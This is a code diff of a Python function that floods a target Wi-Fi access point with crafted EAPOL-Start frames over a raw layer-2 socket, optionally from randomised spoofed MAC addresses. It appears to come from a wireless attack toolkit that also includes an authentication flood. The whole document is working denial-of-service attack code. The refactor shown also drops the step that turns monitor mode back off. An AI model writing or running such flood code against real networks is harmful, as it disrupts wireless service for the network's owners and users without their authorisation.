@@ -75,35 +75,32 @@ def eapol_flood(
 
     set_monitor_active(iface, True)
     try:
-        try:
-            sock = conf.L2socket(iface=iface)
-        except OSError as exc:
-            log(f"EAPOL flood socket open failed: {exc}")
-            return 0
+        sock = conf.L2socket(iface=iface)
+    except OSError as exc:
+        log(f"EAPOL flood socket open failed: {exc}")
+        return 0
 
-        sent = 0
-        try:
-            for i in range(count):
-                if stop_event is not None and stop_event.is_set():
-                    log(f"EAPOL flood stopped after {sent} frame(s) -- stop requested")
-                    return sent
-                src = random_locally_administered_mac() if randomize_client else client
-                assert src is not None  # guaranteed above: randomize_client=False requires client
-                pkt = craft_eapol_start(bssid, src)
-                try:
-                    sock.send(pkt)
-                    sent += 1
-                except OSError as exc:
-                    log(f"EAPOL flood send failed after {sent} frame(s): {exc}")
-                    return sent
-                log(f"EAPOL-Start {i + 1}/{count} sent: {src} -> {bssid}")
-                # Unconditional sleep(interval), even at 0.0 -- see
-                # auth_flood.py's note: a real syscall forces a GIL yield every
-                # frame, which a falsy-guarded skip would not.
-                if i < count - 1:
-                    time.sleep(interval)
-        finally:
-            sock.close()
-        return sent
+    sent = 0
+    try:
+        for i in range(count):
+            if stop_event is not None and stop_event.is_set():
+                log(f"EAPOL flood stopped after {sent} frame(s) -- stop requested")
+                return sent
+            src = random_locally_administered_mac() if randomize_client else client
+            assert src is not None  # guaranteed above: randomize_client=False requires client
+            pkt = craft_eapol_start(bssid, src)
+            try:
+                sock.send(pkt)
+                sent += 1
+            except OSError as exc:
+                log(f"EAPOL flood send failed after {sent} frame(s): {exc}")
+                return sent
+            log(f"EAPOL-Start {i + 1}/{count} sent: {src} -> {bssid}")
+            # Unconditional sleep(interval), even at 0.0 -- see
+            # auth_flood.py's note: a real syscall forces a GIL yield every
+            # frame, which a falsy-guarded skip would not.
+            if i < count - 1:
+                time.sleep(interval)
     finally:
-        set_monitor_active(iface, False)
+        sock.close()
+    return sent
